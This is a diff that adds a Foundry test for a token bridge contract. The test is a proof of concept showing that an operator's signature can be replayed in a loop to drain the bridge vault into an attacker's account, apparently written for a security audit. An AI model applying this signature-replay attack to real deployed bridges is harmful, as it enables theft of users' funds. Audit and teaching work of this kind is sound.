@@ -18,6 +18,7 @@ contract L1BossBridgeTest is Test {
     address userInL2 = makeAddr("userInL2");
     address bob = makeAddr("bob");
     Account operator = makeAccount("operator");
+    address attacker = makeAddr("attacker");
 
     L1Token token;
     L1BossBridge tokenBridge;
@@ -234,5 +235,35 @@ contract L1BossBridgeTest is Test {
         returns (uint8 v, bytes32 r, bytes32 s)
     {
         return vm.sign(privateKey, MessageHashUtils.toEthSignedMessageHash(keccak256(message)));
+    }
+
+    function test_SignatureReplay() public {
+        uint256 vaultInitialBalance = 1000e18;
+        uint attackerInitialBalance = 100e18;
+        deal(address(token), address(vault), vaultInitialBalance);
+        deal(address(token), attacker, attackerInitialBalance);
+
+        vm.startPrank(attacker);
+        
+        token.approve(address(tokenBridge), type(uint256).max);
+        tokenBridge.depositTokensToL2(attacker, attacker, attackerInitialBalance);
+
+        bytes memory message = abi.encode(
+            address(token),
+            0,
+            abi.encodeCall(IERC20.transferFrom, (address(vault), attacker, attackerInitialBalance))
+        );
+
+        (uint8 v, bytes32 r, bytes32 s) = vm.sign(operator.key,
+             MessageHashUtils.toEthSignedMessageHash(keccak256(
+                message)));
+
+        while(token.balanceOf(address(vault)) > 0) {
+            tokenBridge.withdrawTokensToL1(attacker, attackerInitialBalance, v, r, s);
+        }
+
+        assertEq(token.balanceOf(address(attacker)), attackerInitialBalance + vaultInitialBalance);
+        
+        vm.stopPrank();
     }
 }
